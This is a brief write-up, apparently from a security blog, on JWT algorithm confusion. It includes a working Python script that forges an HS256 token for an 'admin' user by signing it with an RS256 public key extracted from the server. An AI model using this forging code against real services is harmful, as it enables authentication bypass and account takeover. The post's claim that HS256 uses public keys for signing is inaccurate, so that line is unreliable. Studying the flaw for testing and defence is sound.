---
title: JWT Confusion
date: 2024-07-14
categories: [Payload]
tags: [Write up]
---

## Refer

[Portswigger Document](https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens)  
[JWT vulnerability🩸](https://velog.io/@thelm3716/JWTvul#%F0%9F%A9%B8-exploitation-2)

## Info
This Problem is JWT confusion. 

RS256 uses an asymmetric key, a private key for generation, and a public key for verification.

HS256 uses public keys for both token creation and verification. By using the difference between the two, authentication can be bypassed by extracting the public key of RS256 and creating a token with HS256 when verifying both methods.

Key extract : https://github.com/silentsignal/rsa_sign2n/tree/release/standalone

## Exploit
After Extract key, you can sign JWT as You Want.
```python
import json
import base64
import hashlib
import hmac

key = open("./key.pem").read() # Extracted Key

headDict = {"alg": "HS256","typ": "JWT"}
paylDict = {
  "username": "admin",
  "iat": 1720866236,
  "exp": 1720953073
}

newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
newContents = newContents.encode().decode('UTF-8')

newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")

print(newContents+"."+newSig)
```
**Key Example** ( Don't forget EOL )
```jsx
-----BEGIN PUBLIC KEY-----
(...)
-----END PUBLIC KEY-----

```